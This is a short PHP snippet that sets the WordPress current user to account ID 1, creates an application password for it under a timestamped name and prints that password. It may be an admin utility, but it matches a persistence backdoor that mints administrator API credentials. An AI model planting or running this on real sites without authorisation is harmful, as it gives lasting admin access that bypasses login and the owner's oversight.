<?php
wp_set_current_user(1); [$pw]=WP_Application_Passwords::create_new_application_password(1,['name'=>'t'.time()]); echo $pw;
